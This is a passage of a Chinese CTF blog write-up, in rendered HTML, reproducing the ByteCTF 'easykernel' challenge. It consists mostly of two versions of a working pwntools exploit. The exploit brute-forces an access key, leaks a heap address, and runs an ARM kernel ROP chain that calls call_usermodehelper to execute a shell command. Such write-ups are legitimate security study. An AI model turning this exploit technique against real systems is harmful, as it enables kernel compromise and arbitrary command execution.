class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>简化版</p>
+<p>也就简化了20行😢</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对标志控制不严格导致的漏洞类型有了比较深刻的印象，了解学习了arm指令集以及寻找gadget的思路。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/08/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/" rel="prev" title="mit6.081操作系统课程及实验">
+      <i class="fa fa-chevron-left"></i> mit6.081操作系统课程及实验
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bytectf-easykernel-%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">bytectf easykernel 复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
